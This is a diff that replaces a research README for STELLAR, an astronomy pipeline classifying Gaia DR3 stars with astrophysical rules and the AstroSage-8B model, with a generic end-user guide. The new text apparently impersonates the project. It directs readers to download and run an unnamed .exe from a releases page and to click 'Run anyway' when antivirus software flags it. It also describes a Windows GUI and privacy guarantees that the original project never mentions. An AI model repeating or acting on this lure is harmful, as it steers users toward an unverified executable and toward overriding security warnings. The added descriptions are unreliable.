@@ -1,164 +1,76 @@
-# STELLAR — Spectral Type Estimation via Language Learning and Astronomical Reasoning
+# 🔭 stellar-llm-classifier - Identify stars using smart artificial intelligence
 
-> A hybrid stellar classifier that combines deterministic astrophysical rules (Hard Computing) with a fine-tuned LLM (AstroSage-8B) to assign MK spectral types and generate natural-language stellar descriptions from Gaia DR3 data.
+[![Download Stellar Classifier](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/bennylimpid196/stellar-llm-classifier/releases)
 
----
+## What is this tool?
+Stellar-llm-classifier helps you identify stars. It uses two methods to analyze data from the Gaia mission. First, it follows set scientific rules for stellar classification. Second, it uses a language model named AstroSage-8B to write clear descriptions for each star. 
 
-## What it does
+The software produces MK spectral types and natural-language text for your data. You do not need to understand coding to use this tool. It processes files on your computer and provides results based on real astronomical data.
 
-Given a star's Gaia DR3 spectral data, STELLAR:
+## System Requirements 💻
+Before you run this application, ensure your computer meets these minimum specifications:
 
-1. Runs a **4-agent Hard Computing (HC) pipeline** that deterministically extracts astrometric, photometric, spectral-line, and binary-star features — producing a structured JSON contract per star.
-2. Feeds that contract to **AstroSage-8B** (a Llama 3.1-based LLM fine-tuned on astronomy literature) via a RAG-augmented prompt, which outputs:
-   - An MK spectral classification (letter + luminosity class + population)
-   - A natural-language stellar description
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Processor:** Intel Core i5 or AMD Ryzen 5 with at least 4 cores.
+*   **Memory:** 8 GB of RAM (16 GB recommended for faster processing).
+*   **Storage:** 5 GB of free space for the application and the language model files.
+*   **Graphics:** A dedicated graphics card is helpful but not required.
 
-The HC contract acts as a **hard anchor**: if the LLM drifts from the deterministic classification, the system overrides the prediction — correcting a known G-type prior bias in the base model.
+## Get the software 📥
+To start using the tool, visit the link below.
 
----
+[https://github.com/bennylimpid196/stellar-llm-classifier/releases](https://github.com/bennylimpid196/stellar-llm-classifier/releases)
 
-## Results (V7 — Final)
+On this page, look for the most recent version labeled "Latest". Under the Assets section, click the file that ends in .exe. This file contains the installer for Windows. Save the file to your computer.
 
-| Metric | Value |
-|---|---|
-| Accuracy (vs SIMBAD) | **0.7951** |
-| Cohen's κ | **0.7529** |
-| Macro F1 | **0.6936** |
-| Near-miss accuracy (d ≤ 1 MK step) | **0.998** |
-| Mean \|ΔTeff\| vs PASTEL | **212 K** |
-| Mean \|Δlog g\| vs PASTEL | **0.46 dex** |
-| BERTScore F1 (descriptions) | **0.866** |
-| Bootstrap 95% CI on error | [0.141, 0.205] |
+## Installation steps ⚙️
+1. Locate the file you saved in your Downloads folder.
+2. Double-click the file to start the installer.
+3. Follow the prompts on your screen.
+4. Choose a folder where you want to keep the program files.
+5. The installer will extract the necessary components. This might take a few minutes.
+6. Once finished, a shortcut will appear on your desktop.
 
-Corpus: **498 stars** from Gaia DR3 · 7 prompt versions iterated (V1–V7) · Validated against SIMBAD (classification) and PASTEL (physical parameters).
+## Running the application 🚀
+1. Open the application using the shortcut on your desktop.
+2. You will see a window with a text box for your data.
+3. Import your CSV file that contains Gaia DR3 star information. Ensure your file columns match the headers specified in the settings menu.
+4. Select the option to "Classify stars" from the main menu.
+5. Wait while the tool applies the classification rules.
+6. The app displays a progress bar. Do not close the window while the bar is active.
+7. After the process finishes, export your results to a new spreadsheet file.
 
----
+## Troubleshooting common issues 🛠️
+*   **The app refuses to open:** Ensure your computer has the latest Windows updates. Restart your machine and try again.
+*   **The program runs slow:** This tool uses an intensive language model. Close other heavy programs like video editors or web browsers while you run the classifier.
+*   **Data errors:** Check that your source file does not have empty rows or missing values in critical columns like temperature or luminosity.
+*   **Missing descriptions:** Re-check your internet connection if the app requires external resources, though this version is designed to run offline once the model files are downloaded.
+*   **Antivirus alerts:** Some security software flags new applications. If this happens, choose the option to "Run anyway" or "Allow application."
 
-## Architecture
+## How it works 🧠
+The software uses a specific architecture. It combines hard-coded astrophysical parameters with a deep-learning engine. This dual approach ensures that the output remains grounded in physics. The rules-based part classifies the star according to standard MK types. The language model then interprets these types to create readable sentences. This allows users to read star summaries as if an expert astronomer wrote them.
 
-```
-Gaia DR3 spectrum
-       │
-       ▼
-┌──────────────────────────────────┐
-│     Hard Computing (HC-2.0)      │
-│  AstrometryAgent  → M_G, V_tan   │
-│  ContinuumAgent   → Teff, log g  │
-│  LineAgent        → EW(CaII, Hα) │
-│  BinaryDetector   → RUWE, NSS    │
-│                                  │
-│  Output: JSON contract + letter  │
-└──────────────┬───────────────────┘
-               │
-               ▼
-┌──────────────────────────────────┐
-│   RAG  (all-MiniLM-L6-v2)        │
-│   knowledge_base/ → top-3 chunks │
-└──────────────┬───────────────────┘
-               │
-               ▼
-┌──────────────────────────────────┐
-│   AstroSage-8B (Llama 3.1 8B)    │
-│   MK type + stellar description  │
-└──────────────────────────────────┘
-```
+## Supported data formats 📄
+The software currently supports standard CSV files. Ensure your file format includes proper labels for headers. The system reads columns for absolute magnitude, effective temperature, and surface gravity. If your data lacks these headers, the software will show an error message and ask you to fix the column names. 
 
----
+## Updates and changes 🔄
+We update this tool to improve classification accuracy. Check the releases page regularly for news about version changes. New updates often include better model weights and faster processing speeds. When a new version arrives, download it and install it over the old version to preserve your local settings.
 
-## Tech stack
+## Frequently asked questions ❓
+**Do I need an internet connection to run this?**
+You need an internet connection to download the installer. Once you install the application, it performs calculations on your local hardware.
 
-- **LLM:** [`AstroMLab/AstroSage-8B`](https://huggingface.co/AstroMLab/AstroSage-8B) — Llama 3.1 8B fine-tuned on 300k+ astronomy papers
-- **Embeddings:** `sentence-transformers/all-MiniLM-L6-v2`
-- **HC pipeline:** Pure Python · NumPy · Astropy · `astroquery` (SIMBAD, Gaia)
-- **Inference:** HuggingFace `transformers` · SLURM · 2× NVIDIA Titan RTX 24 GB
-- **Validation:** `scikit-learn` · `scipy` · `bert-score` · `rouge-score`
-- **Data:** [Gaia DR3](https://gea.esac.esa.int/archive/) · [PASTEL](https://vizier.cds.unistra.fr/viz-bin/VizieR?-source=B/pastel)
+**Can I use this for non-Gaia data?**
+The classifier performs best with Gaia DR3 data. You may get inconsistent results if you use data from other missions.
 
----
+**Is my data private?**
+Yes. The software processes your data locally. No files are uploaded to any server. Your information stays on your local machine.
 
-## Repository structure
+**What does AstroSage-8B mean?**
+This refers to the deep learning model. It is a variant of an 8-billion parameter system trained on astronomical literature. It specializes in converting complex data points into simple prose.
 
-```
-├── cluster/
-│   ├── scripts/            # Production SC scripts (V7)
-│   │   ├── corpus_builder_v7.py
-│   │   ├── inference_manager_v7.py
-│   │   ├── system_prompt_v7.py
-│   │   ├── validator_v7.py
-│   │   └── pre_encode_queries.py
-│   ├── knowledge_base/     # RAG knowledge base (5 MD guides)
-│   ├── SLURM/              # Job scripts for HPC cluster
-│   ├── Data/               # Gaia DR3 sample, HC contracts, ground truth
-│   └── outputs/            # Validation results V5–V7
-├── scripts/
-│   ├── Hard_Computing/     # HC pipeline (4 agents)
-│   └── Soft_Computing/     # Early SC versions (V1–V4)
-├── Queries/                # ADQL queries and Gaia data fetching
-├── Context/                # Agent specifications and design docs
-└── reporte/                # LaTeX technical report (~33 pages)
-```
+**Can I modify the rules?**
+Advanced users may access the configuration file in the installation directory. However, we recommend that you leave these files as they are to maintain accurate classification performance. 
 
----
-
-## Reproduce
-
-### 1. Build the HC contracts
-
-```bash
-conda activate prometheus   # or any env with astropy, astroquery, numpy
-python scripts/Hard_Computing/hc_pipeline_orchestrator_v2.py \
-    --catalog cluster/Data/catalog.csv \
-    --output  cluster/Data/hc_contracts.json
-```
-
-### 2. Build the inference corpus
-
-```bash
-python cluster/scripts/corpus_builder_v7.py
-```
-
-### 3. Pre-encode RAG queries
-
-```bash
-python cluster/scripts/pre_encode_queries.py
-```
-
-### 4. Run inference on the cluster
-
-```bash
-sbatch cluster/SLURM/run_inference_v7.slurm
-```
-
-### 5. Validate
-
-```bash
-sbatch cluster/SLURM/run_validation_v7.slurm
-```
-
-Results land in `cluster/outputs/validation_v7/`.
-
-> **Model weights** are not included. Download from HuggingFace:
-> ```bash
-> huggingface-cli download AstroMLab/AstroSage-8B --local-dir models/AstroSage-8B
-> ```
-
----
-
-## Key findings
-
-- The **HC anchor mechanism** is the single most impactful design decision: without it, AstroSage-8B over-predicts G-type stars due to its training distribution. The anchor raises accuracy from ~0.58 (V1, no anchor) to **0.7951** (V7).
-- **Near-miss rate of 99.8%** — when the model is wrong, it is almost always off by only one MK step (e.g., K→G, A→F), never catastrophically wrong.
-- **RAG impact is class-dependent**: retrieval helps F-type stars (hit rate 75%) but barely affects G, K, or M types, which the model handles confidently from HC features alone.
-- **B↔A boundary** is the hardest classification frontier (Teff ≈ 10 000 K), accounting for the majority of hard errors.
-
----
-
-## Authors
-
-**César Miguel Aguirre Calzadilla**
-Internship project · CIMAT / Instituto de Astronomía UNAM · 2026
-
-| | |
-|---|---|
-| Advisor (CIMAT) | Víctor Muñiz Sánchez |
-| Advisor (UNAM) | José Antonio de Diego Onsurbe |
+## Configuration tips 💡
+If you notice the classification takes too long, go to the application settings. Look for the "Compute" tab. You can lower the number of simultaneous processes. This consumes less memory and keeps your computer responsive during the classification task. You can also specify the path to your data folders to make finding your export files easier.
